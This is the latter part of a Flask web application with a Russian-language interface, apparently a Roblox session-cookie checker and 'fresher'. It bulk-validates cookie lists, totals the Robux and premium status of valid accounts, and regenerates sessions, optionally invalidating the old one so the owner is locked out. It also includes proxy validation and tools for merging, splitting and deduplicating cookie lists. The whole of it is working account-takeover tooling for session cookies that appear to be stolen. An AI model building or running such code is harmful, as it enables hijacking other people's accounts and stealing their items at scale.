                <button class="btn btn-secondary btn-sm fresher-mode-btn" id="btnKill" onclick="setFresherMode('kill')">💀 Инвалидировать старую</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
            <div style="margin-top:12px;display:flex;gap:10px;">
                <button class="btn btn-primary" onclick="runFresher()">⚡ Обновить сессии</button>
            </div>
            
            <div class="result-container" id="fresherContainer" style="display:none;">
                <div class="result-header">
                    <span class="result-title">ОБНОВЛЕННЫЕ КУКИ:</span>
                    <div class="action-btn-group">
                        <button class="btn-action-small" onclick="copyBoxText('fresherResult')">📋 Копировать</button>
                        <button class="btn-action-small" onclick="downloadTxtFromBox('fresherResult', 'refreshed_cookies.txt')">📥 Скачать TXT</button>
                        <button class="btn-action-small" id="btnToggle_fresherResult" onclick="toggleBox('fresherResult')">▼</button>
                    </div>
                </div>
                <div class="result-box" id="fresherResult"></div>
            </div>
        </div>
    </div>

    <!-- ИСТОРИЯ -->
    <div class="tab-content" id="tab-history">
        <div class="card">
            <h2>📋 История Чекера <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2>
            <div id="checkerHistoryList">Загрузка истории...</div>
        </div>
        <div class="card">
            <h2>🔄 История Фрешера <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2>
            <div id="fresherHistoryList">Загрузка истории...</div>
        </div>
    </div>

    <!-- ИНСТРУМЕНТЫ -->
    <div class="tab-content" id="tab-tools">
        <div class="tool-grid">
            <div class="card">
                <h3>🔗 Слияние TXT файлов</h3>
                <div class="upload-area" id="mergeDropArea" onclick="document.getElementById('mergeFiles').click()">
                    <p style="font-weight:700;">📁 Перетащите TXT файлы</p>
                </div>
                <input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;">
                <div id="mergeFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
                <button class="btn btn-primary btn-sm" onclick="mergeCookies()" style="margin-top:12px;width:100%;">Объединить в один TXT</button>
                <div class="result-box" id="mergeResult" style="display:none;margin-top:10px;"></div>
            </div>

            <div class="card">
                <h3>✂️ Разделение куки</h3>
                <textarea id="splitInput" placeholder="Вставьте куки списком..." rows="3"></textarea>
                <div style="margin-top:10px;display:flex;align-items:center;gap:10px;">
                    <label style="font-size:12px;font-weight:700;color:var(--text-muted);">Куков на файл:</label>
                    <input type="number" id="splitCount" value="10" min="1" style="padding:8px;width:100px;">
                </div>
                <button class="btn btn-primary btn-sm" onclick="splitCookies()" style="margin-top:12px;width:100%;">Разделить и Скачать ZIP</button>
                <div class="result-box" id="splitResult" style="display:none;margin-top:10px;"></div>
            </div>

            <div class="card">
                <h3>🧹 Дедупликация списков</h3>
                <textarea id="cleanInput" placeholder="Вставьте куки..." rows="4"></textarea>
                <button class="btn btn-primary btn-sm" onclick="cleanCookies()" style="margin-top:12px;width:100%;">Удалить дубликаты</button>
                <div class="result-box" id="cleanResult" style="display:none;margin-top:10px;"></div>
            </div>

            <div class="card">
                <h3>⚡ Валидатор Прокси</h3>
                <textarea id="proxyInput" placeholder="ip:port или ip:port:user:pass списком..." rows="4"></textarea>
                <button class="btn btn-primary btn-sm" onclick="checkProxies()" style="margin-top:12px;width:100%;">Проверить прокси</button>
                <div class="result-box" id="proxyResult" style="display:none;margin-top:10px;"></div>
            </div>

            <div class="card">
                <h3>🔍 Сравнение Списков (Diff)</h3>
                <textarea id="diffListA" placeholder="Список A (Исходный)..." rows="2" style="margin-bottom:6px;"></textarea>
                <textarea id="diffListB" placeholder="Список B (Новый)..." rows="2"></textarea>
                <button class="btn btn-primary btn-sm" onclick="diffCookies()" style="margin-top:12px;width:100%;">Найти только в списке B</button>
                <div class="result-box" id="diffResult" style="display:none;margin-top:10px;"></div>
            </div>

            <div class="card">
                <h3>🛠️ Генератор Фейк-Кук (Test)</h3>
                <button class="btn btn-secondary btn-sm" onclick="generateDummyCookie()" style="width:100%;">Сгенерировать тестовый кук</button>
            </div>
        </div>
    </div>

    <div class="footer">KAI CHECKER PRO © ALL RIGHTS RESERVED</div>
</div>

<script>
// --- AUDIO & TOAST UTILS ---
let alertTimeout;
function playSuccessSound() {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain); gain.connect(ctx.destination);
        osc.type = 'sine'; osc.frequency.setValueAtTime(587.33, ctx.currentTime); // D5
        gain.gain.setValueAtTime(0.08, ctx.currentTime);
        osc.start(); osc.stop(ctx.currentTime + 0.15);
    } catch(e) {}
}

function showAlert(message) {
    const alertEl = document.getElementById('custom-alert');
    document.getElementById('custom-alert-msg').innerText = message || 'Действие выполнено';
    alertEl.classList.add('show');
    clearTimeout(alertTimeout);
    alertTimeout = setTimeout(() => closeAlert(), 3500);
}

function closeAlert() { document.getElementById('custom-alert').classList.remove('show'); }

function copyBoxText(boxId) {
    const box = document.getElementById(boxId);
    if (!box || !box.textContent.trim()) return showAlert('Нет данных для копирования');
    navigator.clipboard.writeText(box.textContent.trim());
    showAlert('📋 Скопировано в буфер обмена!');
}

// --- HOTKEYS ---
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.key === 'Enter') {
        const activeTab = document.querySelector('.tab.active').dataset.tab;
        if (activeTab === 'checker') runSingleCheck();
        else if (activeTab === 'fresher') runFresher();
    }
    if (e.ctrlKey && e.key === 's') {
        e.preventDefault();
        const activeTab = document.querySelector('.tab.active').dataset.tab;
        if (activeTab === 'checker') downloadTxtFromBox('singleResult', 'single_report.txt');
    }
});

// --- PARTICLES ---
const canvas = document.getElementById('particles-canvas');
const ctx = canvas.getContext('2d');
let particles = [];
function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
window.addEventListener('resize', resizeCanvas); resizeCanvas();

for(let i=0; i<35; i++) {
    particles.push({
        x: Math.random() * canvas.width, y: Math.random() * canvas.height,
        r: Math.random() * 2 + 1, dx: (Math.random() - 0.5) * 0.4, dy: (Math.random() - 0.5) * 0.4,
        alpha: Math.random() * 0.3 + 0.1
    });
}
function animateParticles() {
    ctx.clearRect(0,0,canvas.width,canvas.height);
    particles.forEach(p => {
        ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
        ctx.fillStyle = `rgba(217, 70, 239, ${p.alpha})`;
        ctx.shadowBlur = 4; ctx.shadowColor = '#a855f7'; ctx.fill();
        p.x += p.dx; p.y += p.dy;
        if(p.x<0 || p.x>canvas.width) p.dx *= -1;
        if(p.y<0 || p.y>canvas.height) p.dy *= -1;
    });
    requestAnimationFrame(animateParticles);
}
animateParticles();

// --- TAB SYSTEM ---
function activateTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    const targetBtn = document.querySelector(`.tab[data-tab="${tabName}"]`);
    const targetContent = document.getElementById('tab-' + tabName);
    if(targetBtn && targetContent) {
        targetBtn.classList.add('active'); targetContent.classList.add('active');
        localStorage.setItem('kai_active_tab', tabName);
        if(tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
    }
}
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() { activateTab(this.dataset.tab); });
});
window.addEventListener('DOMContentLoaded', () => {
    activateTab(localStorage.getItem('kai_active_tab') || 'checker');
});

function toggleTheme() {
    const html = document.documentElement;
    html.setAttribute('data-theme', html.getAttribute('data-theme')==='dark'?'light':'dark');
}

function toggleBox(boxId) {
    const box = document.getElementById(boxId);
    if (!box) return;
    box.style.display = box.style.display === 'none' ? 'block' : 'none';
}

function downloadTxtFromBox(boxId, defaultFilename = 'report.txt') {
    const box = document.getElementById(boxId);
    if (!box || !box.textContent.trim()) return showAlert('Нет данных!');
    const blob = new Blob([box.textContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = defaultFilename;
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

// --- DRAG AND DROP ---
function setupDragAndDrop(areaId, inputId, infoId) {
    const area = document.getElementById(areaId);
    const input = document.getElementById(inputId);
    const info = document.getElementById(infoId);
    if(!area || !input) return;

    ['dragenter', 'dragover'].forEach(e => area.addEventListener(e, prev => { prev.preventDefault(); area.classList.add('drag-over'); }));
    ['dragleave', 'drop'].forEach(e => area.addEventListener(e, prev => { prev.preventDefault(); area.classList.remove('drag-over'); }));
    area.addEventListener('drop', e => {
        if(e.dataTransfer.files.length) {
            input.files = e.dataTransfer.files;
            if(info) info.textContent = `Файл выбран: ${input.files[0].name}`;
        }
    });
    input.addEventListener('change', function() {
        if(this.files.length && info) info.textContent = `Файл выбран: ${this.files[0].name}`;
    });
}
setupDragAndDrop('massDropArea', 'massFile', 'massFileInfo');
setupDragAndDrop('mergeDropArea', 'mergeFiles', 'mergeFileInfo');

// --- API ACTIONS ---
let lastMassReports = [];

async function runSingleCheck() {
    const cookie = document.getElementById('singleCookie').value.trim();
    if(!cookie) return showAlert('Вставьте кук!');
    document.getElementById('singleContainer').style.display = 'block';
    document.getElementById('singleResult').style.display = 'block';
    document.getElementById('singleResult').innerHTML = '<span class="spinner"></span> Идёт асинхронный чек...';
    
    const res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie}) });
    const data = await res.json();
    document.getElementById('singleResult').textContent = data.report || 'Ошибка';
    playSuccessSound();
}

async function runMassCheck() {
    const file = document.getElementById('massFile').files[0];
    if(!file) return showAlert('Выберите TXT файл!');
    const fd = new FormData(); fd.append('file', file);
    document.getElementById('massContainer').style.display = 'block';
    document.getElementById('massResult').style.display = 'block';
    document.getElementById('massProgress').style.width = '40%';
    document.getElementById('massResult').innerHTML = '<span class="spinner"></span> Обработка пакета куков через Aiohttp...';
    
    const res = await fetch('/api/mass-check', { method: 'POST', body: fd });
    const data = await res.json();
    document.getElementById('massProgress').style.width = '100%';
    setTimeout(() => document.getElementById('massProgress').style.width = '0%', 800);
    
    if(data.success) {
        lastMassReports = data.full_reports || [];
        document.getElementById('statValid').textContent = data.valid_count;
        document.getElementById('statRobux').textContent = data.total_robux.toLocaleString();
        document.getElementById('statPremium').textContent = data.premium_count;
        document.getElementById('massResult').textContent = data.results.join('\n\n');
        playSuccessSound();
    } else {
        document.getElementById('massResult').textContent = data.message || 'Ошибка обработки';
    }
}

async function downloadMassZip() {
    if (!lastMassReports.length) return showAlert('Нет готовых отчетов!');
    const res = await fetch('/api/download-zip', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({reports: lastMassReports})
    });
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a'); a.href = url; a.download = 'accounts_reports.zip';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
}

function setFresherMode(m) {
    document.getElementById('fresherMode').value = m;
    document.getElementById('btnDup').classList.remove('active-mode');
    document.getElementById('btnKill').classList.remove('active-mode');
    if(m === 'duplicate') document.getElementById('btnDup').classList.add('active-mode');
    else document.getElementById('btnKill').classList.add('active-mode');
}

async function runFresher() {
    const cookies = document.getElementById('fresherCookies').value.trim();
    const mode = document.getElementById('fresherMode').value;
    if(!cookies) return showAlert('Вставьте куки!');
    document.getElementById('fresherContainer').style.display = 'block';
    document.getElementById('fresherResult').style.display = 'block';
    document.getElementById('fresherResult').innerHTML = '<span class="spinner"></span> Асинхронная перегенерация сессий...';
    
    const res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies, mode}) });
    const data = await res.json();
    document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка обновления';
    playSuccessSound();
}

// --- HISTORY ---
async function loadCheckerHistory() {
    const res = await fetch('/api/history/checker');
    const data = await res.json();
    let html = '';
    data.history.slice().reverse().forEach((i, idx) => {
        const resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
        const usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
        const boxId = `chk_hist_${idx}`;
        html += `
        <div class="history-card">
            <div class="history-header">
                <span>🕒 ${i.timestamp} — Валид: ${i.valid} / ${i.total}</span>
                <div class="action-btn-group">
                    <button class="btn-action-small" onclick="copyBoxText('${boxId}')">📋</button>
                    <button class="btn-action-small" onclick="toggleBox('${boxId}')">▼</button>
                </div>
            </div>
            <div class="history-users">👤 Аккаунты: ${usernames}</div>
            <div class="result-box" id="${boxId}" style="display:none;">${resultsText}</div>
        </div>`;
    });
    document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
}

async function loadFresherHistory() {
    const res = await fetch('/api/history/fresher');
    const data = await res.json();
    let html = '';
    data.history.slice().reverse().forEach((i, idx) => {
        const cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
        const usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
        const boxId = `frs_hist_${idx}`;
        html += `
        <div class="history-card">
            <div class="history-header">
                <span>🕒 ${i.timestamp} (${i.mode}) — Обновлено: ${i.refreshed_count} шт.</span>
                <div class="action-btn-group">
                    <button class="btn-action-small" onclick="copyBoxText('${boxId}')">📋</button>
                    <button class="btn-action-small" onclick="toggleBox('${boxId}')">▼</button>
                </div>
            </div>
            <div class="history-users">👤 Аккаунты: ${usernames}</div>
            <div class="result-box" id="${boxId}" style="display:none;">${cookiesText}</div>
        </div>`;
    });
    document.getElementById('fresherHistoryList').innerHTML = html || 'История пуста';
}

async function clearCheckerHistory() { await fetch('/api/history/checker/clear', {method:'POST'}); loadCheckerHistory(); }
async function clearFresherHistory() { await fetch('/api/history/fresher/clear', {method:'POST'}); loadFresherHistory(); }

// --- ADVANCED TOOLS ---
async function mergeCookies() {
    const files = document.getElementById('mergeFiles').files;
    if(files.length < 2) return showAlert('Выберите от 2 TXT файлов!');
    const fd = new FormData(); Array.from(files).forEach(f => fd.append('files', f));
    const box = document.getElementById('mergeResult');
    box.style.display = 'block'; box.innerHTML = '<span class="spinner"></span> Объединение...';
    
    const res = await fetch('/api/merge-cookies', {method:'POST', body:fd});
    const data = await res.json();
    box.innerHTML = data.success ? `✅ Объединено! <a href="${data.download_url}" style="color:var(--accent-pink);">Скачать TXT</a>` : '❌ Ошибка';
}

async function splitCookies() {
    const textInput = document.getElementById('splitInput').value;
    const perFile = parseInt(document.getElementById('splitCount').value) || 10;
    if(!textInput.trim()) return showAlert('Вставьте куки!');
    const box = document.getElementById('splitResult');
    box.style.display = 'block'; box.innerHTML = '<span class="spinner"></span> Разделение...';

    const fd = new FormData();
    fd.append('text', textInput);
    fd.append('per_file', perFile);

    const res = await fetch('/api/split-cookies', {method:'POST', body:fd});
    const data = await res.json();
    box.innerHTML = data.success ? `✅ Создано ${data.total_files} файлов! <a href="${data.download_url}" style="color:var(--accent-pink);">Скачать ZIP</a>` : '❌ Ошибка';
}

async function cleanCookies() {
    const content = document.getElementById('cleanInput').value;
    if(!content.trim()) return showAlert('Вставьте куки!');
    const box = document.getElementById('cleanResult');
    box.style.display = 'block'; box.innerHTML = '<span class="spinner"></span> Очистка...';
    
    const res = await fetch('/api/clean-cookies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content})});
    const data = await res.json();
    box.innerHTML = data.success ? `✅ Уникальных: ${data.count} шт. <a href="${data.download_url}" style="color:var(--accent-pink);">Скачать TXT</a>` : '❌ Ошибка';
}

async function checkProxies() {
    const proxies = document.getElementById('proxyInput').value.trim();
    if(!proxies) return showAlert('Вставьте прокси!');
    const box = document.getElementById('proxyResult');
    box.style.display = 'block'; box.innerHTML = '<span class="spinner"></span> Проверка прокси...';

    const res = await fetch('/api/tools/validate-proxies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({proxies: proxies.split('\n')})});
    const data = await res.json();
    let text = `Живые прокси (${data.valid_count}/${data.total}):\n`;
    data.results.forEach(p => { if(p.valid) text += `✅ ${p.proxy} [${p.latency}ms]\n`; });
    box.textContent = text;
}

async function diffCookies() {
    const listA = document.getElementById('diffListA').value;
    const listB = document.getElementById('diffListB').value;
    const box = document.getElementById('diffResult');
    box.style.display = 'block';
    
    const res = await fetch('/api/tools/diff-cookies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({listA, listB})});
    const data = await res.json();
    box.textContent = `Уникальных куков в B: ${data.count} шт.\n\n` + data.diff.join('\n');
}

function generateDummyCookie() {
    const randomHex = Array.from({length: 300}, () => Math.floor(Math.random()*16).toString(16)).join('').toUpperCase();
    const dummy = `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-to-your-account-and-steal-your-ROBUX-and-items.|_${randomHex}`;
    navigator.clipboard.writeText(dummy);
    showAlert('🧪 Тестовый кук сгенерирован и скопирован!');
}
</script>
</body>
</html>"""

# ==========================================
# API МАРШРУТЫ И ENDPOINTS
# ==========================================
@app.route("/")
def index():
    get_user_session_id()
    return render_template_string(HTML)

@app.route("/api/single-check", methods=["POST"])
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
    
    info = asyncio.run(async_get_full_info(cookie))
    report = format_full_report(info)
    
    add_checker_history({
        'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0,
        'usernames': [info['Username']] if info['status']=='✅' else ['Unauthed'],
        'results': [report],
        'full_reports': [{'username': info['Username'], 'user_id': info['UserID'], 'report': report}]
    })
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check", methods=["POST"])
def api_mass_check():
    content = ""
    if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
    cookies = extract_cookies_from_text(content)
    if not cookies: return jsonify({"success": False, "message": "Куки в файле не обнаружены"})
    
    results = asyncio.run(async_mass_check(cookies, max_concurrent=40))
    valid = [r for r in results if r['status']=='✅']
    formatted = [format_quick_report(r) for r in results]
    
    full_reports = []
    usernames = []
    for r in valid:
        if r.get('full_info'):
            full_reports.append({
                'username': r['username'],
                'user_id': r['user_id'],
                'report': format_full_report(r['full_info'])
            })
            usernames.append(r['username'])
            
    premium_count = sum(1 for r in valid if r.get('is_premium'))
    total_robux = sum(r.get('robux',0) for r in valid)
    
    add_checker_history({
        'type': 'mass', 'total': len(results), 'valid': len(valid),
        'usernames': usernames, 'results': formatted, 'full_reports': full_reports
    })
    return jsonify({
        "success": True, "valid_count": len(valid), "premium_count": premium_count,
        "total_robux": total_robux, "results": formatted, "full_reports": full_reports
    })

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
    
    async def process_all_fresher():
        tasks = [async_refresh_roblox_cookie(c, mode=='kill') for c in cookies_list]
        return await asyncio.gather(*tasks)

    results = asyncio.run(process_all_fresher())
    only_cookies = [res['new_cookie'] for res in results if res['success'] and res['new_cookie']]
    usernames = [res.get('username','?') for res in results if res['success']]

    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'usernames': usernames, 'cookies': only_cookies})
    return jsonify({"success": True, "only_cookies": '\n'.join(only_cookies)})

@app.route("/api/download-zip", methods=["POST"])
def api_download_zip():
    data = request.json or {}
    reports = data.get("reports", [])
    if not reports: return jsonify({"success": False, "message": "Отчеты отсутствуют"})
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for r in reports:
            fname = f"{r.get('username','user')}_{r.get('user_id','id')}.txt"
            zf.writestr(fname, r.get('report',''))
            
    zip_buffer.seek(0)
    return send_file(zip_buffer, mimetype="application/zip", as_attachment=True, download_name="roblox_accounts.zip")

@app.route("/api/tools/validate-proxies", methods=["POST"])
def api_validate_proxies():
    data = request.json or {}
    proxies = data.get("proxies", [])
    
    async def process_proxies():
        tasks = [async_validate_proxy(p) for p in proxies if p.strip()]
        return await asyncio.gather(*tasks)
        
    results = asyncio.run(process_proxies())
    valid_count = sum(1 for p in results if p['valid'])
    return jsonify({"success": True, "total": len(results), "valid_count": valid_count, "results": results})

@app.route("/api/tools/diff-cookies", methods=["POST"])
def api_diff_cookies():
    data = request.json or {}
    list_a = extract_cookies_from_text(data.get("listA", ""))
    list_b = extract_cookies_from_text(data.get("listB", ""))
    
    set_a = set(list_a)
    diff = [c for c in list_b if c not in set_a]
    return jsonify({"success": True, "count": len(diff), "diff": diff})

@app.route("/api/history/checker")
def api_history_checker(): return jsonify({"history": load_history(get_user_history_file("checker"))})

@app.route("/api/history/fresher")
def api_history_fresher(): return jsonify({"history": load_history(get_user_history_file("fresher"))})

@app.route("/api/history/checker/clear", methods=["POST"])
def api_clear_checker_history():
    save_history(get_user_history_file("checker"), [])
    return jsonify({"success": True})

@app.route("/api/history/fresher/clear", methods=["POST"])
def api_clear_fresher_history():
    save_history(get_user_history_file("fresher"), [])
    return jsonify({"success": True})

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    files = request.files.getlist('files')
    contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    merged = merge_cookie_files(contents)
    
    user_dir, sid = get_user_download_dir()
    filename = f"merged_{int(time.time())}.txt"
    filepath = os.path.join(user_dir, filename)
    with open(filepath, 'w', encoding='utf-8') as f: f.write(merged)
    return jsonify({"success": True, "download_url": f"/downloads/{sid}/{filename}"})

@app.route("/api/split-cookies", methods=["POST"])
def api_split_cookies():
    files = request.files.getlist('files')
    text_input = request.form.get('text', '')
    per_file = int(request.form.get('per_file', 10))

    all_contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    if text_input: all_contents.append(text_input)

    cookies = extract_cookies_from_text('\n'.join(all_contents))
    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})

    chunks = [cookies[i:i + per_file] for i in range(0, len(cookies), per_file)]
    user_dir, sid = get_user_download_dir()
    zip_filename = f"splitted_cookies_{int(time.time())}.zip"
    zip_filepath = os.path.join(user_dir, zip_filename)

    with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, chunk in enumerate(chunks, 1):
            zf.writestr(f"cookies_part_{idx}.txt", '\n'.join(chunk))

    return jsonify({"success": True, "total_files": len(chunks), "download_url": f"/downloads/{sid}/{zip_filename}"})

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    processed = remove_duplicates(data.get("content", ""))
    
    user_dir, sid = get_user_download_dir()
    filename = f"cleaned_{int(time.time())}.txt"
    filepath = os.path.join(user_dir, filename)
    with open(filepath, 'w', encoding='utf-8') as f: f.write(processed)
    
    count = len([line for line in processed.split('\n') if line.strip()])
    return jsonify({"success": True, "count": count, "download_url": f"/downloads/{sid}/{filename}"})

@app.route("/downloads/<sid>/<filename>")
def download_file(sid, filename):
    if sid != get_user_session_id(): return jsonify({"error": "Forbidden"}), 403
    return send_from_directory(os.path.join("downloads", sid), filename, as_attachment=True)

# ==========================================
# ТОЧКА ВХОДА
# ==========================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
